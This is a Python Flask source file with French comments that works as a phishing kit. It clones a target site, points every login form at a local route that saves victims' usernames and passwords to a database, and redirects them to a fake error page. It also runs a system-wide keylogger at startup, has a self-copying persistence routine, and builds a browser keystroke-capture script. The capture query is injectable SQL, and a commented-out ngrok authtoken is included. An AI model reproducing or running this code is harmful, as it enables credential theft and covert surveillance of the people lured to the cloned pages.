import os
import re
import requests
import urllib.request
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify, render_template,session, send_from_directory,redirect,render_template_string
from urllib.parse import urljoin, urlparse
from pynput.keyboard import Key, Listener
import shutil
import subprocess
import sys
import time
import sqlalchemy
import pandas as pd
from pyngrok import ngrok
from threading import Thread
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By

engine=sqlalchemy.create_engine('sqlite:///credentials.db')


keys = []
last_key = None  # Stocke la dernière touche pressée

#service = Service(r"C:\ProgramData\chromedriver-win64\chromedriver.exe")  # Sur Windows


# Initialisez le driver avec le service
#driver = webdriver.Chrome(service=service)

# Ouvrir une page web pour tester
#driver.get('https://www.google.com')



from sqlalchemy import text
import pandas as pd
from flask import Flask, request, redirect, session
from flask_sqlalchemy import SQLAlchemy

# authtoken = "2lG6JqzcW8DhgqhSqZXrxzpIw58_3tr1KfYjK9wLJjqrFozuE"
# ngrok.set_auth_token(authtoken)

# ngrok_tunnel = ngrok.connect(5000)

# print(f"Tunnel public URL: {ngrok_tunnel.public_url}")


app = Flask(__name__)

# Configuration de la base de données SQLite
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///credentials.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Définition du modèle de base de données
class DBInfo(db.Model):
    __tablename__ = 'DB_INFO'
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    site_name = db.Column(db.String(255), nullable=False)
    username = db.Column(db.String(255), nullable=False)
    password = db.Column(db.String(255), nullable=False)

# Création de la table si elle n'existe pas déjà
with app.app_context():
    db.create_all()

# def create_table():
#     with engine.connect() as connection:
#         connection.execute(text("""
#             CREATE TABLE IF NOT EXISTS DB_INFO (
#                 id INTEGER PRIMARY KEY AUTOINCREMENT,
#                 site_name TEXT NOT NULL,
#                 username TEXT NOT NULL,
#                 password TEXT NOT NULL,
#                 site_url TEXT NOT NULL              

#             )
#         """))

# create_table()

def on_press(key):
    global last_key
    if key != last_key:  # Enregistre la touche seulement si elle est différente de la dernière
        keys.append(key)
        write_file(keys)
    last_key = key

def write_file(keys):
    with open('log.txt', 'a') as f:  # Change 'w' to 'a' to append to the file instead of overwriting
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)
        keys.clear()  # Clear the list after writing to file


def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Utilisez cette fonction si vous souhaitez copier le script et l'ajouter au démarrage
def copy():
    temp_path = r"C:\Users\PC\AppData\Local\Temp\keylogger.py"
    current_path = os.path.abspath(__file__)
    if current_path != temp_path:
        shutil.copyfile(current_path, temp_path)
        subprocess.Popen([sys.executable, temp_path])
        sys.exit()

# Watchdog pour redémarrer le keylogger en cas de modification du fichier
class KeyloggerEventHandler(FileSystemEventHandler):
    def __init__(self, script_path):
        self.script_path = script_path

    def on_modified(self, event):
        if event.src_path == self.script_path:
            subprocess.Popen([sys.executable, self.script_path])

def start_watchdog(script_path):
    event_handler = KeyloggerEventHandler(script_path)
    observer = Observer()
    observer.schedule(event_handler, os.path.dirname(script_path), recursive=False)
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

keylogger_thread = Thread(target=start_keylogger)
keylogger_thread.start()


def clean_filename(filename):
    return re.sub(r'[^\w\-_\. ]', '_', filename)


def modify_form_action(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Modifier l'attribut action de tous les formulaires
    for form in soup.find_all('form'):
        form['action'] = '/login'
         
    return str(soup)

def clone_site(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Referer': url
        }
        session = requests.Session()
        response = session.get(url)  # Requête pour télécharger les ressources avec les cookies

        modified_html = modify_form_action(response.text)

        print(f"Fetching {url} - Status Code: {response.status_code}")
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            os.makedirs('cloned_site', exist_ok=True)
            print("Created cloned_site directory")
            



            keylogger_script = '''
            <script>
            document.addEventListener('keydown', function(event) {
                fetch('/log_keystroke', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ key: event.key })
                });
            });
            </script>
            '''
            soup.body.append(BeautifulSoup(keylogger_script, 'html.parser'))



            # Sauvegarde du HTML
            with open('cloned_site/index.html', 'a', encoding='utf-8', errors='replace') as file:
                 file.write(modified_html)
                
            print("Saved index.html")
            

            #    # Lancer Selenium pour interagir avec la page clonée
            # service = Service(executable_path=r"C:\ProgramData\chromedriver-win64\chromedriver.exe")
            # driver = webdriver.Chrome(service=service)

            # # Charger la page clonée localement
            # driver.get(f"file://{os.path.abspath('cloned_site/index.html')}")

            # # Exemple d'interaction avec la page
            # # Par exemple, remplir un formulaire
            # try:
            #     username_input = driver.find_element(By.NAME, "email")
            #     password_input = driver.find_element(By.NAME, "pass")
            #     username_input.send_keys("testuser")
            #     password_input.send_keys("password123")
            #     # Submitting the form
            #     password_input.submit()
            # except Exception as e:
            #     print(f"An error occurred during Selenium automation: {str(e)}")

            # # Attendre pour observer les résultats
            # time.sleep(5)

            # # Fermer le navigateur
            # driver.quit()

            os.makedirs('cloned_site/assets', exist_ok=True)
            print("Created assets directory")
            
            # Téléchargement des images
            for img in soup.find_all('img'):
                src = img.get('src')
                if src:
                    img_url = urljoin(url, src)
                    img_name = os.path.basename(src)
                    img_name = clean_filename(img_name)
                    img_path = os.path.join('cloned_site/assets', img_name)
                    try:
                        urllib.request.urlretrieve(img_url, img_path)
                        print(f"Téléchargement de l'image {img_name} depuis {img_url}")
                    except urllib.error.HTTPError as e:
                        print(f"Erreur lors du téléchargement de l'image {img_url}: {e}")
                    except Exception as e:
                        print(f"Erreur générale lors du téléchargement de l'image {img_url}: {e}")

            # Téléchargement des CSS
            for link in soup.find_all('link', {'rel': 'stylesheet'}):
                href = link.get('href')
                if href:
                    css_url = urljoin(url, href)
                    css_name = os.path.basename(href)
                    css_name = clean_filename(css_name)
                    css_path = os.path.join('cloned_site/assets', css_name)
                    try:
                        urllib.request.urlretrieve(css_url, css_path)
                        print(f"Téléchargement du CSS {css_name} depuis {css_url}")
                    except urllib.error.HTTPError as e:
                        print(f"Erreur lors du téléchargement du CSS {css_url}: {e}")
                    except Exception as e:
                        print(f"Erreur générale lors du téléchargement du CSS {css_url}: {e}")

            # Téléchargement des JS
            for script in soup.find_all('script'):
                src = script.get('src')
                if src:
                    js_url = urljoin(url, src)
                    js_name = os.path.basename(src)
                    js_name = clean_filename(js_name)
                    js_path = os.path.join('cloned_site/assets', js_name)
                    try:
                        urllib.request.urlretrieve(js_url, js_path)
                        print(f"Téléchargement du JavaScript {js_name} depuis {js_url}")
                    except urllib.error.HTTPError as e:
                        print(f"Erreur lors du téléchargement du JavaScript {js_url}: {e}")
                    except Exception as e:
                        print(f"Erreur générale lors du téléchargement du JavaScript {js_url}: {e}")

            return True
        else:
            print(f"Failed to fetch {url}. Status Code: {response.status_code}")
            return False
    except Exception as e:
        # Affiche une erreur plus détaillée dans le terminal
        print(f"Error in clone_site: {str(e)}")
        return False


@app.route('/cloned_site/<path:filename>')
def serve_cloned_site(filename):
   return send_from_directory('cloned_site', filename)


@app.route('/test')
def test():
    return "Flask is working!"

@app.route('/log-key', methods=['POST'])
def log_key():
    data = request.get_json()
    key = data.get('key')
    if key:
        with open('log.txt', 'a') as log_file:
            log_file.write(key)
    return jsonify(success=True)


@app.route('/')
def index():
    # Servir la page où l'utilisateur peut entrer l'URL à cloner
    return render_template('index.html')  # Assurez-vous que votre page HTML s'appelle bien 'index.html' et qu'elle se trouve dans le dossier 'templates'

@app.route('/login', methods=['POST'])
def capture():
    if request.method == 'POST':
        form_data = request.form

        site_name = request.host  # Assurez-vous que cette valeur est envoyée depuis le formulaire
        username = request.form.get('username')
        password = request.form.get('password')
        site_url = request.form.get('site_url')  # Récupère l'URL originale
    print("Form data received:", request.form)


    print(f"Site name: {site_name}, Username: {username}, Password: {password}")

    if not site_name or not username or not password:
        return "Failed to capture login details - one or more fields are empty.", 400

    DB_INFO = pd.read_sql(
        f"SELECT * FROM DB_INFO WHERE username='{username}' AND password='{password}'", engine)

    # Créer un DataFrame avec les informations à stocker
    df = pd.DataFrame({
        'site_name': [site_name],
        'username': [username],
        'password': [password]
    })

    # Enregistrer les données dans la base de données
    df.to_sql('DB_INFO', engine, if_exists='append', index=False)

    # Rediriger l'utilisateur vers l'URL originale après avoir capturé les informations de connexion
    # original_url = request.form.get('original_url')
    # if original_url:
    #     return redirect(original_url)
    # else:
    #     # Si l'URL d'origine n'est pas disponible, rediriger vers la page d'accueil du site cloné
    return redirect('/error.html')


@app.route('/error.html', methods=['GET','POST'])
def error():
    
     #username = session.get('username')
     return render_template('/error.html')

@app.route('/clone', methods=['POST'])
def clone():
    try:
        data = request.get_json()
        url = data.get('url')
        print(f"Received URL: {url}")
        if url:
            success = clone_site(url)
            if success:
                # Créez le lien relatif vers le fichier HTML cloné
                clone_path = "/cloned_site/index.html"
                return jsonify(success=True, link=clone_path)
            else:
                return jsonify(success=False)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        return jsonify(success=False)

if __name__ == "__main__":


 app.run(debug=True, port=5000)

